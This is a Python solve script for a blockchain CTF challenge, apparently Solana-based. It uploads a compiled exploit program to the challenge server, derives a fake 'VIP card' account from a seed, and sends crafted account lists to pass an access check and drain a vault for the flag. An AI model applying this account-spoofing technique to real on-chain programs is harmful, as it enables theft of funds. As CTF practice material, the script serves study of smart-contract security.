import socket
import struct
import hashlib
import time
import sys
from base58 import b58decode, b58encode

HOST = 'challenge.cnsc.com.vn'
PORT = 32512

EXPLOIT_PATH = 'solution/target/deploy/exploit.so' 

def p32(x): return struct.pack('<I', x)

def create_with_seed(base_pubkey_bytes, seed_str, program_id_bytes):
    buf = base_pubkey_bytes + seed_str.encode('utf-8') + program_id_bytes
    hashed = hashlib.sha256(buf).digest()
    return hashed

def solve():
    # Nhận Port từ tham số dòng lệnh nếu có (cho tiện)
    target_port = int(sys.argv[1]) if len(sys.argv) > 1 else PORT
    
    print(f"[*] Connecting to {HOST}:{target_port}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, target_port))
    f = s.makefile('rw', encoding='utf-8', errors='ignore')

    # 1. Đọc lời chào
    print("--- Reading Welcome ---")
    while True:
        line = f.readline()
        print(line.strip())
        if "become VIP?" in line:
            break

    # 2. GỬI EXPLOIT (Tên rỗng)
    print("\n[*] Sending Exploit Program...")
    try:
        with open(EXPLOIT_PATH, 'rb') as fd:
            so_data = fd.read()
    except FileNotFoundError:
        print(f"[-] Error: File {EXPLOIT_PATH} not found.")
        return

    s.sendall(p32(0)) # Name len = 0
    s.sendall(p32(len(so_data))) # Content len
    s.sendall(so_data) # Content
    print(f"[*] Sent exploit ({len(so_data)} bytes).")

    # 3. Đọc Challenge Info (Xử lý kỹ hơn)
    program_id = None
    vault = None
    player = None

    print("\n--- Reading Challenge Info ---")
    while True:
        line = f.readline()
        if not line: break
        
        # In ra raw line để debug
        sys.stdout.write(line)
        
        # Logic parse linh hoạt hơn
        clean_line = line.strip()
        
        # Parse Program ID (hỗ trợ nhiều format)
        if "Program ID:" in clean_line:
            program_id = clean_line.split(":")[-1].strip()
        elif "program pubkey:" in clean_line:
            # Trường hợp dòng chỉ có "program pubkey:", key có thể ở dòng sau?
            # Hoặc server in dính liền "program pubkey:ByKey..."
            parts = clean_line.split(":")
            if len(parts) > 1 and len(parts[1].strip()) > 30:
                program_id = parts[1].strip()
        # Trường hợp dòng chỉ chứa key (nếu server in xuống dòng)
        elif len(clean_line) > 30 and not " " in clean_line and program_id is None:
             # Đoán mò nếu dòng đó trông giống base58
             if clean_line.isalnum(): 
                 pass # Có thể là key, nhưng rủi ro.

        if "Vault:" in clean_line:
            vault = clean_line.split(":")[-1].strip()
        if "Player:" in clean_line:
            player = clean_line.split(":")[-1].strip()
        
        if "Submit Your Solution" in clean_line:
            break

    # Nếu thiếu ID, thử hardcode hoặc báo lỗi
    if not (program_id and vault and player):
        print("\n[-] CRITICAL: Failed to parse Challenge Info.")
        print("[-] Server crash or unexpected output format.")
        return

    print(f"\n[+] Parsed Info: PROG={program_id}, VAULT={vault}, PLAYER={player}")

    # 4. Tính toán Fake Card
    system_prog_str = "11111111111111111111111111111111"
    player_bytes = b58decode(player)
    system_prog_bytes = b58decode(system_prog_str)
    
    fake_card_bytes = create_with_seed(player_bytes, "vip_bypass", system_prog_bytes)
    fake_card_str = b58encode(fake_card_bytes).decode()
    
    print(f"[*] Calculated Fake Card: {fake_card_str}")

    # 5. Gửi Instruction
    s.sendall(p32(0)) # Instruction Data Len = 0

    accounts = [
        (player, True, True),
        (vault, False, True),
        (program_id, False, False),
        (system_prog_str, False, False),
        (fake_card_str, False, True)
    ]
    
    print(f"[*] Sending instruction with {len(accounts)} accounts...")
    s.sendall(p32(len(accounts)))
    
    for pub, is_signer, is_writable in accounts:
        s.sendall(b58decode(pub))
        s.sendall(bytes([1 if is_signer else 0]))
        s.sendall(bytes([1 if is_writable else 0]))

    # 6. Nhận Flag
    print("\n--- Challenge Result ---")
    while True:
        line = f.readline()
        if not line: break
        print(line.strip())

if __name__ == "__main__":
    solve()